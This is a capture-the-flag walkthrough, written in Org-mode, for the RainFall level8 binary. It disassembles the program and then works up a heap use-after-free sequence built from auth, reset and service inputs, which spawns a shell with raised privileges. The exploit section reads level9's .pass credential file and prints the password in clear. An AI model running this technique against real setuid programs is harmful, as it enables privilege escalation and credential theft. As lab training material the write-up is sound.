#+title: walkthrough
* For binary explotation
** look for strings of the program
#+begin_src shell
level8@RainFall:~$ readelf -p .rodata level8
String dump of section '.rodata':
  [     8]  %p, %p ^J   -> pointer, pointer
  [    11]  auth 
  [    17]  reset
  [    1d]  service
  [    25]  login
  [    2b]  /bin/sh     -> interesting path
  [    33]  Password:^J -> may ask for a password stdin ?
  
#+end_src

** search for functions used in the binarie
#+begin_src shell
gdb info functions 
All defined functions:

Non-debugging symbols:
0x08048410  printf
0x08048410  printf@plt -> maybe exploit format string
0x08048420  free@plt
0x08048430  strdup@plt 
0x08048440  fgets@plt
0x08048450  fwrite@plt
0x08048460  strcpy@plt -> interesting 4 overflow
0x08048470  malloc@plt -> interesting
0x08048480  system@plt -> nice convination with /bin/sh
0x08048564  main -> just this function
#+end_src
** search for globals vars
#+begin_src shell
gdb -batch ./$USER -ex "info variables"
All defined variables:

Non-debugging symbols:
0x08048808  _fp_hw
0x0804880c  _IO_stdin_used
0x08048948  __FRAME_END__
0x0804994c  __CTOR_LIST__
0x0804994c  __init_array_end
0x0804994c  __init_array_start
0x08049950  __CTOR_END__
0x08049954  __DTOR_LIST__
0x08049958  __DTOR_END__
0x0804995c  __JCR_END__
0x0804995c  __JCR_LIST__
0x08049960  _DYNAMIC
0x08049a2c  _GLOBAL_OFFSET_TABLE_
0x08049a60  __data_start
0x08049a60  data_start
0x08049a64  __dso_handle
0x08049a80  stdin@@GLIBC_2.0
0x08049aa0  stdout@@GLIBC_2.0
0x08049aa4  completed.6159
0x08049aa8  dtor_idx.6161
0x08049aac  auth #Interesting
0x08049ab0  service #
#+end_src
* Binary analysis
#+begin_src shell
  (gdb) set disassembly-flavor intel
  (gdb) disass main
  Dump of assembler code for function main:
     0x08048564 <+0>:	push   ebp
     0x08048565 <+1>:	mov    ebp,esp
     0x08048567 <+3>:	push   edi
     0x08048568 <+4>:	push   esi
     0x08048569 <+5>:	and    esp,0xfffffff0 -> align the stack 16 bits
     0x0804856c <+8>:	sub    esp,0xa0       -> allocate space for local 160      
     0x08048572 <+14>:	jmp    0x8048575 <main+17>
     0x08048574 <+16>:	nop   -> weird maybe the begin of the while 
     0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0 # param 2 global service
     0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac # param 1 global auth
     0x08048581 <+29>:	mov    eax,0x8048810 -> "%p, %p ^J" format string
     0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx
     0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx
     0x0804858e <+42>:	mov    DWORD PTR [esp],eax
     0x08048591 <+45>:	call   0x8048410 <printf@plt> # call printf
     0x08048596 <+50>:	mov    eax,ds:0x8049a80             # stdin
     0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax
     0x0804859f <+59>:	mov    DWORD PTR [esp+0x4],0x80 -> nbr of char to read 8 * 16 = 8 * 8 * 2 = 64 * 2 = 128
     0x080485a7 <+67>:	lea    eax,[esp+0x20] -> buffer local
     0x080485ab <+71>:	mov    DWORD PTR [esp],eax
     0x080485ae <+74>:	call   0x8048440 <fgets@plt>
     0x080485b3 <+79>:	test   eax,eax                  -> if EOF
     0x080485b5 <+81>:	je     0x804872c <main+456>     -> jmp out of loop
     0x080485bb <+87>:	lea    eax,[esp+0x20]
     0x080485bf <+91>:	mov    edx,eax
     0x080485c1 <+93>:	mov    eax,0x8048819
     0x080485c6 <+98>:	mov    ecx,0x5
     0x080485cb <+103>:	mov    esi,edx
     0x080485cd <+105>:	mov    edi,eax
     0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] -> compare strings
     0x080485d1 <+109>:	seta   dl
     0x080485d4 <+112>:	setb   al
     0x080485d7 <+115>:	mov    ecx,edx
     0x080485d9 <+117>:	sub    cl,al
     0x080485db <+119>:	mov    eax,ecx
     0x080485dd <+121>:	movsx  eax,al
     0x080485e0 <+124>:	test   eax,eax
     0x080485e2 <+126>:	jne    0x8048642 <main+222>
     0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4 -> malloc of 4 bytes
     0x080485eb <+135>:	call   0x8048470 <malloc@plt>
     0x080485f0 <+140>:	mov    ds:0x8049aac,eax -> modify global
     0x080485f5 <+145>:	mov    eax,ds:0x8049aac
     0x080485fa <+150>:	mov    DWORD PTR [eax],0x0 -> first char of the global = '\0'
     0x08048600 <+156>:	lea    eax,[esp+0x20] -> buffer local
     0x08048604 <+160>:	add    eax,0x5 ->  advance buffer 5 pos
     0x08048607 <+163>:	mov    DWORD PTR [esp+0x1c],0xffffffff = -1 a var
     0x0804860f <+171>:	mov    edx,eax
     0x08048611 <+173>:	mov    eax,0x0
     0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c] 
     0x0804861a <+182>:	mov    edi,edx
     0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi] -> cmp string
     0x0804861e <+186>:	mov    eax,ecx
     0x08048620 <+188>:	not    eax
     0x08048622 <+190>:	sub    eax,0x1
     0x08048625 <+193>:	cmp    eax,0x1e
     0x08048628 <+196>:	ja     0x8048642 <main+222>
     0x0804862a <+198>:	lea    eax,[esp+0x20]
     0x0804862e <+202>:	lea    edx,[eax+0x5]
     0x08048631 <+205>:	mov    eax,ds:0x8049aac -> auth global var
     0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx
     0x0804863a <+214>:	mov    DWORD PTR [esp],eax
     0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
     0x08048642 <+222>:	lea    eax,[esp+0x20]
     0x08048646 <+226>:	mov    edx,eax
     0x08048648 <+228>:	mov    eax,0x804881f
     0x0804864d <+233>:	mov    ecx,0x5
     0x08048652 <+238>:	mov    esi,edx
     0x08048654 <+240>:	mov    edi,eax
     0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] -> cmp string to free
     0x08048658 <+244>:	seta   dl
     0x0804865b <+247>:	setb   al
     0x0804865e <+250>:	mov    ecx,edx
     0x08048660 <+252>:	sub    cl,al
     0x08048662 <+254>:	mov    eax,ecx
     0x08048664 <+256>:	movsx  eax,al
     0x08048667 <+259>:	test   eax,eax
     0x08048669 <+261>:	jne    0x8048678 <main+276>
     0x0804866b <+263>:	mov    eax,ds:0x8049aac -> auth global var
     0x08048670 <+268>:	mov    DWORD PTR [esp],eax
     0x08048673 <+271>:	call   0x8048420 <free@plt> 
     0x08048678 <+276>:	lea    eax,[esp+0x20]
     0x0804867c <+280>:	mov    edx,eax
     0x0804867e <+282>:	mov    eax,0x8048825
     0x08048683 <+287>:	mov    ecx,0x6
     0x08048688 <+292>:	mov    esi,edx
     0x0804868a <+294>:	mov    edi,eax
     0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] -> cmp string
     0x0804868e <+298>:	seta   dl -> above
     0x08048691 <+301>:	setb   al -> bolew
     0x08048694 <+304>:	mov    ecx,edx 
     0x08048696 <+306>:	sub    cl,al -> zero char
     0x08048698 <+308>:	mov    eax,ecx
     0x0804869a <+310>:	movsx  eax,al -> signed scale
     0x0804869d <+313>:	test   eax,eax
     0x0804869f <+315>:	jne    0x80486b5 <main+337>
     0x080486a1 <+317>:	lea    eax,[esp+0x20] buffer
     0x080486a5 <+321>:	add    eax,0x7 -> add  + 7 pos
     0x080486a8 <+324>:	mov    DWORD PTR [esp],eax
     0x080486ab <+327>:	call   0x8048430 <strdup@plt> -> strdup
     0x080486b0 <+332>:	mov    ds: 0x8049ab0,eax -> service global var
     0x080486b5 <+337>:	lea    eax,[esp+0x20]
     0x080486b9 <+341>:	mov    edx,eax
     0x080486bb <+343>:	mov    eax,0x804882d
     0x080486c0 <+348>:	mov    ecx,0x5 -> may login
     0x080486c5 <+353>:	mov    esi,edx
     0x080486c7 <+355>:	mov    edi,eax
     0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
     0x080486cb <+359>:	seta   dl
     0x080486ce <+362>:	setb   al
     0x080486d1 <+365>:	mov    ecx,edx
     0x080486d3 <+367>:	sub    cl,al
     0x080486d5 <+369>:	mov    eax,ecx
     0x080486d7 <+371>:	movsx  eax,al
     0x080486da <+374>:	test   eax,eax
     0x080486dc <+376>:	jne    0x8048574 <main+16> -> keep in loop
     0x080486e2 <+382>:	mov    eax,ds:0x8049aac -> global var auth
     0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20] -> global var + (2 * 16 = 32 bytes)
     0x080486ea <+390>:	test   eax,eax # if ! *(int *)(global var + 32) -> read 32, 33, 34, 35 bytes. 
     0x080486ec <+392>:	je     0x80486ff <main+411> if all 0 jmp ask for password else
     0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833 -> i guess /bin/sh str
     0x080486f5 <+401>:	call   0x8048480 <system@plt> -> system
     0x080486fa <+406>:	jmp    0x8048574 <main+16> -> keep loop
     0x080486ff <+411>:	mov    eax,ds:0x8049aa0
     0x08048704 <+416>:	mov    edx,eax
     0x08048706 <+418>:	mov    eax,0x804883b
     0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx
     0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa
     0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1
     0x0804871f <+443>:	mov    DWORD PTR [esp],eax
     0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
     0x08048727 <+451>:	jmp    0x8048574 <main+16> -> keep loop
     0x0804872c <+456>:	nop  -> end of loop
     0x0804872d <+457>:	mov    eax,0x0
     0x08048732 <+462>:	lea    esp,[ebp-0x8]
     0x08048735 <+465>:	pop    esi
     0x08048736 <+466>:	pop    edi
     0x08048737 <+467>:	pop    ebp
     0x08048738 <+468>:	ret
  Radare
             0x08048564      55             push ebp
  │           0x08048565      89e5           mov ebp, esp
  │           0x08048567      57             push edi
  │           0x08048568      56             push esi
  │           0x08048569      83e4f0         and esp, 0xfffffff0
  │           0x0804856c      81eca0000000   sub esp, 0xa0
  │       ┌─< 0x08048572      eb01           jmp 0x8048575
  │       │   ; CODE XREFS from main @ 0x80486dc(x), 0x80486fa(x), 0x8048727(x)
  │    ┌┌┌──> 0x08048574      90             nop
  │    ╎╎╎│   ; CODE XREF from main @ 0x8048572(x)
  │    ╎╎╎└─> 0x08048575      8b0db09a0408   mov ecx, dword [obj.service] ; [0x8049ab0:4]=0
  │    ╎╎╎    0x0804857b      8b15ac9a0408   mov edx, dword [obj.auth]   ; [0x8049aac:4]=0
  │    ╎╎╎    0x08048581      b810880408     mov eax, str._p___p__n      ; 0x8048810 ; "%p, %p \n"
  │    ╎╎╎    0x08048586      894c2408       mov dword [nitems], ecx
  │    ╎╎╎    0x0804858a      89542404       mov dword [size], edx
  │    ╎╎╎    0x0804858e      890424         mov dword [esp], eax        ; const char *format
  │    ╎╎╎    0x08048591      e87afeffff     call sym.imp.printf         ; int printf(const char *format)
  │    ╎╎╎    0x08048596      a1809a0408     mov eax, dword [obj.stdin]  ; obj.stdin__GLIBC_2.0
  │    ╎╎╎                                                               ; [0x8049a80:4]=0
  │    ╎╎╎    0x0804859b      89442408       mov dword [nitems], eax     ; FILE *stream
  │    ╎╎╎    0x0804859f      c744240480..   mov dword [size], 0x80      ; [0x80:4]=-1 ; 128 ; int size
  │    ╎╎╎    0x080485a7      8d442420       lea eax, [src]
  │    ╎╎╎    0x080485ab      890424         mov dword [esp], eax        ; char *s
  │    ╎╎╎    0x080485ae      e88dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
  │    ╎╎╎    0x080485b3      85c0           test eax, eax
  │    ╎╎╎┌─< 0x080485b5      0f8471010000   je 0x804872c
  │    ╎╎╎│   0x080485bb      8d442420       lea eax, [src]
  │    ╎╎╎│   0x080485bf      89c2           mov edx, eax
  │    ╎╎╎│   0x080485c1      b819880408     mov eax, str.auth           ; 0x8048819 ; "auth "
  │    ╎╎╎│   0x080485c6      b905000000     mov ecx, 5
  │    ╎╎╎│   0x080485cb      89d6           mov esi, edx
  │    ╎╎╎│   0x080485cd      89c7           mov edi, eax
  │    ╎╎╎│   0x080485cf      f3a6           repe cmpsb byte [esi], byte es:[edi]
  │    ╎╎╎│   0x080485d1      0f97c2         seta dl
  │    ╎╎╎│   0x080485d4      0f92c0         setb al
  │    ╎╎╎│   0x080485d7      89d1           mov ecx, edx
  │    ╎╎╎│   0x080485d9      28c1           sub cl, al
  │    ╎╎╎│   0x080485db      89c8           mov eax, ecx
  │    ╎╎╎│   0x080485dd      0fbec0         movsx eax, al
  │    ╎╎╎│   0x080485e0      85c0           test eax, eax
  │   ┌─────< 0x080485e2      755e           jne 0x8048642
  │   │╎╎╎│   0x080485e4      c704240400..   mov dword [esp], 4          ; size_t size
  │   │╎╎╎│   0x080485eb      e880feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
  │   │╎╎╎│   0x080485f0      a3ac9a0408     mov dword [obj.auth], eax   ; [0x8049aac:4]=0
  │   │╎╎╎│   0x080485f5      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
  │   │╎╎╎│   0x080485fa      c70000000000   mov dword [eax], 0
  │   │╎╎╎│   0x08048600      8d442420       lea eax, [src]
  │   │╎╎╎│   0x08048604      83c005         add eax, 5
  │   │╎╎╎│   0x08048607      c744241cff..   mov dword [var_1ch], 0xffffffff ; [0xffffffff:4]=-1 ; -1
  │   │╎╎╎│   0x0804860f      89c2           mov edx, eax
  │   │╎╎╎│   0x08048611      b800000000     mov eax, 0
  │   │╎╎╎│   0x08048616      8b4c241c       mov ecx, dword [var_1ch]
  │   │╎╎╎│   0x0804861a      89d7           mov edi, edx
  │   │╎╎╎│   0x0804861c      f2ae           repne scasb al, byte es:[edi]
  │   │╎╎╎│   0x0804861e      89c8           mov eax, ecx
  │   │╎╎╎│   0x08048620      f7d0           not eax
  │   │╎╎╎│   0x08048622      83e801         sub eax, 1
  │   │╎╎╎│   0x08048625      83f81e         cmp eax, 0x1e               ; 30
  │  ┌──────< 0x08048628      7718           ja 0x8048642
  │  ││╎╎╎│   0x0804862a      8d442420       lea eax, [src]
  │  ││╎╎╎│   0x0804862e      8d5005         lea edx, [eax + 5]
  │  ││╎╎╎│   0x08048631      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
  │  ││╎╎╎│   0x08048636      89542404       mov dword [size], edx       ; const char *src
  │  ││╎╎╎│   0x0804863a      890424         mov dword [esp], eax        ; char *dest
  │  ││╎╎╎│   0x0804863d      e81efeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
  │  ││╎╎╎│   ; CODE XREFS from main @ 0x80485e2(x), 0x8048628(x)
  │  └└─────> 0x08048642      8d442420       lea eax, [src]
  │    ╎╎╎│   0x08048646      89c2           mov edx, eax
  │    ╎╎╎│   0x08048648      b81f880408     mov eax, str.reset          ; 0x804881f ; "reset"
  │    ╎╎╎│   0x0804864d      b905000000     mov ecx, 5
  │    ╎╎╎│   0x08048652      89d6           mov esi, edx
  │    ╎╎╎│   0x08048654      89c7           mov edi, eax
  │    ╎╎╎│   0x08048656      f3a6           repe cmpsb byte [esi], byte es:[edi]
  │    ╎╎╎│   0x08048658      0f97c2         seta dl
  │    ╎╎╎│   0x0804865b      0f92c0         setb al
  │    ╎╎╎│   0x0804865e      89d1           mov ecx, edx
  │    ╎╎╎│   0x08048660      28c1           sub cl, al
  │    ╎╎╎│   0x08048662      89c8           mov eax, ecx
  │    ╎╎╎│   0x08048664      0fbec0         movsx eax, al
  │    ╎╎╎│   0x08048667      85c0           test eax, eax
  │   ┌─────< 0x08048669      750d           jne 0x8048678
  │   │╎╎╎│   0x0804866b      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
  │   │╎╎╎│   0x08048670      890424         mov dword [esp], eax        ; void *ptr
  │   │╎╎╎│   0x08048673      e8a8fdffff     call sym.imp.free           ; void free(void *ptr)
  │   │╎╎╎│   ; CODE XREF from main @ 0x8048669(x)
  │   └─────> 0x08048678      8d442420       lea eax, [src]
  │    ╎╎╎│   0x0804867c      89c2           mov edx, eax
  │    ╎╎╎│   0x0804867e      b825880408     mov eax, str.service        ; 0x8048825 ; "service"
  │    ╎╎╎│   0x08048683      b906000000     mov ecx, 6
  │    ╎╎╎│   0x08048688      89d6           mov esi, edx
  │    ╎╎╎│   0x0804868a      89c7           mov edi, eax
  │    ╎╎╎│   0x0804868c      f3a6           repe cmpsb byte [esi], byte es:[edi]
  │    ╎╎╎│   0x0804868e      0f97c2         seta dl
  │    ╎╎╎│   0x08048691      0f92c0         setb al
  │    ╎╎╎│   0x08048694      89d1           mov ecx, edx
  │    ╎╎╎│   0x08048696      28c1           sub cl, al
  │    ╎╎╎│   0x08048698      89c8           mov eax, ecx
  │    ╎╎╎│   0x0804869a      0fbec0         movsx eax, al
  │    ╎╎╎│   0x0804869d      85c0           test eax, eax
  │   ┌─────< 0x0804869f      7514           jne 0x80486b5
  │   │╎╎╎│   0x080486a1      8d442420       lea eax, [src]
  │   │╎╎╎│   0x080486a5      83c007         add eax, 7
  │   │╎╎╎│   0x080486a8      890424         mov dword [esp], eax        ; const char *src
  │   │╎╎╎│   0x080486ab      e880fdffff     call sym.imp.strdup         ; char *strdup(const char *src)
  │   │╎╎╎│   0x080486b0      a3b09a0408     mov dword [obj.service], eax ; [0x8049ab0:4]=0
  │   │╎╎╎│   ; CODE XREF from main @ 0x804869f(x)
  │   └─────> 0x080486b5      8d442420       lea eax, [src]
  │    ╎╎╎│   0x080486b9      89c2           mov edx, eax
  │    ╎╎╎│   0x080486bb      b82d880408     mov eax, str.login          ; 0x804882d ; "login"
  │    ╎╎╎│   0x080486c0      b905000000     mov ecx, 5
  │    ╎╎╎│   0x080486c5      89d6           mov esi, edx
  │    ╎╎╎│   0x080486c7      89c7           mov edi, eax
  │    ╎╎╎│   0x080486c9      f3a6           repe cmpsb byte [esi], byte es:[edi]
  │    ╎╎╎│   0x080486cb      0f97c2         seta dl
  │    ╎╎╎│   0x080486ce      0f92c0         setb al
  │    ╎╎╎│   0x080486d1      89d1           mov ecx, edx
  │    ╎╎╎│   0x080486d3      28c1           sub cl, al
  │    ╎╎╎│   0x080486d5      89c8           mov eax, ecx
  │    ╎╎╎│   0x080486d7      0fbec0         movsx eax, al
  │    ╎╎╎│   0x080486da      85c0           test eax, eax
  │    └────< 0x080486dc      0f8592feffff   jne 0x8048574
  │     ╎╎│   0x080486e2      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
  │     ╎╎│   0x080486e7      8b4020         mov eax, dword [eax + 0x20]
  │     ╎╎│   0x080486ea      85c0           test eax, eax
  │    ┌────< 0x080486ec      7411           je 0x80486ff
  │    │╎╎│   0x080486ee      c704243388..   mov dword [esp], str._bin_sh ; [0x8048833:4]=0x6e69622f ; "/bin/sh" ; const char *string
  │    │╎╎│   0x080486f5      e886fdffff     call sym.imp.system         ; int system(const char *string)
  │    │└───< 0x080486fa      e975feffff     jmp 0x8048574
  │    │ ╎│   ; CODE XREF from main @ 0x80486ec(x)
  │    └────> 0x080486ff      a1a09a0408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
  │      ╎│                                                              ; [0x8049aa0:4]=0
  │      ╎│   0x08048704      89c2           mov edx, eax
  │      ╎│   0x08048706      b83b880408     mov eax, str.Password:_n    ; 0x804883b ; "Password:\n"
  │      ╎│   0x0804870b      8954240c       mov dword [stream], edx     ; FILE *stream
  │      ╎│   0x0804870f      c74424080a..   mov dword [nitems], 0xa     ; size_t nitems
  │      ╎│   0x08048717      c744240401..   mov dword [size], 1         ; size_t size
  │      ╎│   0x0804871f      890424         mov dword [esp], eax        ; const void *ptr
  │      ╎│   0x08048722      e829fdffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
  │      └──< 0x08048727      e948feffff     jmp 0x8048574
  │       │   ; CODE XREF from main @ 0x80485b5(x)
  │       └─> 0x0804872c      90             nop
  │           0x0804872d      b800000000     mov eax, 0
  │           0x08048732      8d65f8         lea esp, [var_bp_8h]
  │           0x08048735      5e             pop esi
  │           0x08048736      5f             pop edi
  │           0x08048737      5d             pop ebp
  └           0x08048738      c3             ret
  ## Pseudo

  int main (int argc, char **argv, char **envp) {
      loc_0x08048564:
          // ICOD XREF from entry0 @ 0x80484c7(r)
          push (ebp)
          ebp = esp
          push (edi)
          push (esi)
          esp &= 0xfffffff0
          esp -= 0xa0
          goto loc_0x8048575
      loc_0x08048575:
          // CODE XREF from main @ 0x8048572(x)
          ecx = dword [obj.service] // [0x8049ab0:4]=0
          edx = dword [obj.auth] // [0x8049aac:4]=0
          eax = str._p___p__n // 0x8048810 // "%p, %p \n"
          dword [nitems] = ecx
          dword [size] = edx
          dword [esp] = eax // const char *format
          sym.imp.printf ()  // int printf("%p, %p \n")
          eax = dword [obj.stdin] // obj.stdin__GLIBC_2.0 // [0x8049a80:4]=0
          dword [nitems] = eax // FILE *stream
          dword [size] = 0x80 // [0x80:4]=-1 // 128 // int size
          eax = src
          dword [esp] = eax // char *s
          sym.imp.fgets ()  // char *fgets("", -1, -1)
          v = eax & eax
          if (!v) goto loc_0x804872c // unlikely
          goto loc_0x080485bb;
          goto loc_0x080485bb;
          return eax;
      loc_0x080485bb:
          eax = src
          edx = eax
          eax = str.auth // 0x8048819 // "auth "
          ecx = 5
          esi = edx
          edi = eax     // "auth " str.auth
          repe cmpsb byte [esi] byte es:[edi] // "uth "
          seta dl
          setb al
          ecx = edx     // ebp
          cl -= al
          eax = ecx
          eax = al
          v = eax & eax
          if (v) goto loc_0x8048642 // likely
          goto loc_0x080485e4;
      loc_0x08048642:
          // CODE XREFS from main @ 0x80485e2(x), 0x8048628(x)
          eax = src
          edx = eax
          eax = str.reset // 0x804881f // "reset"
          ecx = 5
          esi = edx
          edi = eax     // "reset" str.reset
          repe cmpsb byte [esi] byte es:[edi] // "eset"
          seta dl
          setb al
          ecx = edx     // ebp
          cl -= al
          eax = ecx
          eax = al
          v = eax & eax
          if (v) goto loc_0x8048678 // likely
          goto loc_0x0804866b;
      loc_0x08048678:
          // CODE XREF from main @ 0x8048669(x)
          eax = src
          edx = eax
          eax = str.service // 0x8048825 // "service"
          ecx = 6
          esi = edx
          edi = eax     // "service" str.service
          repe cmpsb byte [esi] byte es:[edi] // "ervice"
          seta dl
          setb al
          ecx = edx     // ebp
          cl -= al
          eax = ecx
          eax = al
          v = eax & eax
          if (v) goto loc_0x80486b5 // likely
          goto loc_0x080486a1;
      loc_0x080486b5:
          // CODE XREF from main @ 0x804869f(x)
          eax = src
          edx = eax
          eax = str.login // 0x804882d // "login"
          ecx = 5
          esi = edx
          edi = eax     // "login" str.login
          repe cmpsb byte [esi] byte es:[edi] // "ogin"
          seta dl
          setb al
          ecx = edx     // ebp
          cl -= al
          eax = ecx
          eax = al
          v = eax & eax
          if (v) goto loc_0x8048574 // likely
          goto loc_0x080486e2;
      loc_0x08048574:
          // CODE XREFS from main @ 0x80486dc(x), 0x80486fa(x), 0x8048727(x)
           goto loc_0x08048575
      loc_0x080485e4:  // orphan
           dword [esp] = 4          // size_t size
           sym.imp.malloc ()  //  void *malloc(-1)
           dword [obj.auth] = eax   // [0x8049aac:4]=0
           eax = dword [obj.auth]   // [0x8049aac:4]=0
           dword [eax] = 0
           eax = src
           eax += 5
           dword [var_1ch] = 0xffffffff // [0xffffffff:4]=-1 // -1
           edx = eax
           eax = 0
           ecx = dword [var_1ch]
           edi = edx
           repne scasb al byte es:[edi]
           eax = ecx
           eax = !eax
           eax -= 1
           v = eax - 0x1e           // 30
           if (((unsigned) v) > 0) 
           goto loc_0x08048642
      loc_0x0804862a:  // orphan
           eax = src
           edx = eax + 5
           eax = dword [obj.auth]   // [0x8049aac:4]=0
           dword [size] = edx       // const char *src
           dword [esp] = eax        // char *dest
           sym.imp.strcpy ()  // char *strcpy(NULL, "")
      loc_0x0804866b:  // orphan
           eax = dword [obj.auth]   // [0x8049aac:4]=0
           dword [esp] = eax        // void *ptr
           sym.imp.free ()  // void free(NULL)
      loc_0x080486a1:  // orphan
           eax = src
           eax += 7
           dword [esp] = eax        // const char *src
           sym.imp.strdup ()  // char *strdup("")
           dword [obj.service] = eax // [0x8049ab0:4]=0
      loc_0x080486e2:  // orphan
           eax = dword [obj.auth]   // [0x8049aac:4]=0
           eax = dword [eax + 0x20]
           v = eax & eax
           if (!v) 
           goto loc_0x080486ff
      loc_0x080486ee:  // orphan
           dword [esp] = str._bin_sh // [0x8048833:4]=0x6e69622f // "/bin/sh" // const char *string
           sym.imp.system ()  // int system("/bin/sh")
           goto loc_0x08048574
      loc_0x080486ff:  // orphan
           // CODE XREF from main @ 0x80486ec(x)
           eax = dword [obj.stdout] // obj.stdout__GLIBC_2.0 // [0x8049aa0:4]=0
           edx = eax
           eax = str.Password:_n    // 0x804883b // "Password:\n"
           dword [stream] = edx     // FILE *stream
           dword [nitems] = 0xa     // size_t nitems
           dword [size] = 1         // size_t size
           dword [esp] = eax        // const void *ptr
           sym.imp.fwrite () // size_t fwrite(0x73736150, 0xff000000, -1, -1)
           goto loc_0x08048574
      loc_0x0804872c:  // orphan
           // CODE XREF from main @ 0x80485b5(x)
           eax = 0
           esp = var_bp_8h
           esi = pop ()
           edi = pop ()             // (pstr 0x0804883b) "Password:\n" ebp
           ebp = pop ()              // "Password:\n" str.Password:_n
           return
          return eax;
  }
#+end_src
[[source]]

** Initial value globals
#+begin_src shell
x/wx &auth
0x8049aac <auth>:	0x00000000
(gdb) x/wx &service
0x8049ab0 <service>:	0x00000000
#+end_src
** Let's test with ltrace
#+begin_src shell
 ltrace ./level8
__libc_start_main(0x8048564, 1, 0xbffffd14, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)#printf output kind of awful(nil), (nil)
"fgets(hola\n", 128, 0xb7fd1ac0)                = 0xbffffbf0
  fgets(auth
"auth\n", 128, 0xb7fd1ac0)                      = 0xbffffbf0
fgets(auth 
"auth \n", 128, 0xb7fd1ac0)                     = 0xbffffbf0
malloc(4)                                             = 0x0804a008
strcpy(0x0804a008, "\n")                              = 0x0804a008
with 'auth ' malloc 4 and strcpy overflow danger.
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) ; the pointer changes

fgets(reset 
"reset \n", 128, 0xb7fd1ac0)                    = 0xbffffbf0
free(0x0804a008)                                      = <void>
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil) 
)                 = 18
fgets(service 
"service \n", 128, 0xb7fd1ac0)                  = 0xbffffbf0
strdup(" \n")                                         = 0x0804a008
printf("%p, %p \n", 0x804a008, 0x804a0080x804a008, 0x804a008  -> strdup of the string reuse the same addr that auth.
)             = 22
fgets(login
"login\n", 128, 0xb7fd1ac0)                     = 0xbffffbf0
fwrite("Password:\n", 1, 10, 0xb7fd1a20Password:
)              = 10

#+end_src
** Curiosity
Cause the condition for memcmp is 6 you could use servic and work fine be careful cause for string add one char more for example a space.
#+begin_src shell
servic  AAAAAAAAAAAAAAAA
#+end_src
*** Bad practice
#+begin_src shell
  auth 
  0x804a008, (nil) 
  reset
  0x804a008, (nil) 
  reset
  ,*** glibc detected *** /home/user/level8/level8: double free or corruption (fasttop): 0x0804a008 ***
#+end_src
** Attack point
*** CANC First Strategy
CLOSED: [2025-11-21 Fri 11:39]
:LOGBOOK:
- State "CANC"       from              [2025-11-21 Fri 11:39] \\
  Don't reach the result
:END:
'auth ' malloc 4 and strcpy overflow danger.
'auth' + 32 Byte offset for enter to system("/bin/sh").
'auth' strcpy limit to 30B don't got the enough size to  reach the desire va. 
*** Second Strategy
1. "auth usr\n"  # with a valid user of 4 chars \n included.
2. "service "+ "B" * service_len
3. "login"
   #+begin_src shell
     len of service to enter in system
     #    auth_va  , service_va
          0x804a008, 0x804a018 
     # auth_va + 0x20 = 0x804a028
     # service_va + 0x10(16) = 0x804a028 
     "service " + "B"*16
   #+end_src
**** Proof of Concept
   #+begin_src shell
     (nil), (nil) 
     auth usr
     0x804a008, (nil) 
     service BBBBBBBBBBBBBBBB
     0x804a008, 0x804a018 
     login
     $ id
     uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)# i am in gdb
   #+end_src
*** Third Strategy
1. "auth [3B]\n" # Optional use Three Bytes before newline
2. "reset"#free the auth malloc but still with the va of the malloc free.
3.  "service" + "B"*32  # strdup will use or not the va of previous malloc being free.
4. "login"
**** Proof of Concept
#+begin_src shell
(nil), (nil) 
auth 
0x804a008, (nil) 
reset
0x804a008, (nil) 
servic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ id
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
$ exit
0x804a008, 0x804a018 
#+end_src
* Exploit
#+begin_src shell
"auth bla\n"
"reset"
"serviceCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" -> 36 'C'
"login\n"
#Explotation Completed just need stop execution with ltrace
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
level8@RainFall:~$ su level9
Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
level9@RainFall:~$ 
#+end_src
